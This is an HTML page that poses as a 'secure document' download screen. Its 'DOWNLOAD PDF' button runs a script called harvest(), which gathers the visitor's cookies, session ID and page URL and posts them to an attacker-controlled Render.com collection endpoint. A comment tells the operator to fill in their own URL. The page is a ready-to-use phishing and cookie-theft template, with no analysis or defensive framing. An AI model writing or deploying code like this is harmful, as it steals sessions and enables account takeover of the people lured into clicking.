<!DOCTYPE html>
<html>
<head><title>Document Download</title></head>
<body>
    <h2 style="text-align:center; margin-top:50px; font-family:sans-serif;">
        Your secure document is ready.
    </h2>
    <div style="text-align:center; margin-top:20px;">
        <a href="https://example.com/your-doc.pdf" 
           onclick="harvest()" 
           style="background:#007bff; color:white; padding:15px 25px; text-decoration:none; border-radius:5px; font-family:sans-serif; font-weight:bold;">
           DOWNLOAD PDF
        </a>
    </div>

    <script>
        async function harvest() {
            const data = {
                job_id: "production",
                url: window.location.href,
                cookies: document.cookie,
                session_id: (document.cookie.match(/sessionid=([^;]+)/) || ["","none"])[1]
            };
            
            // REPLACE the URL below with your actual Render.com URL
            await fetch('https://your-render-app.onrender.com/collect', {
                method: 'POST',
                mode: 'cors', 
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.log("HARVEST FAILED"));
        }
    </script>
</body>
</html>
